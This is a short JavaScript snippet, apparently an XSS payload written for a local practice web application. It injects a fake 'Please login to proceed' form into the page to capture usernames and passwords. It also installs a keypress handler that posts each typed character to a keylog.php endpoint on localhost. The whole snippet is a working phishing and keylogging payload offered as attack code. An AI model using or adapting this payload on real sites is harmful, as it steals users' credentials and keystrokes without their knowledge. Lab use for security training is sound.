document.getElementsByClassName('xsstest').innerHTML = '<div class="error"><h3>Please login to proceed</h3> <form>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br></div>';


document.onkeypress = function(evt) {
    evt = evt || window.event
    key = String.fromCharCode(evt.charCode)
    if (key) {
        var http = new XMLHttpRequest();
        var param = encodeURI (key)
        http.open("POST", "http://localhost:8000/vulnerable_web_app/current_build/keylog.php", true);
        http.setRequestHeader("content-type", "application/x-www-form-urlencoded");
        http.send("key="+param);
    }
}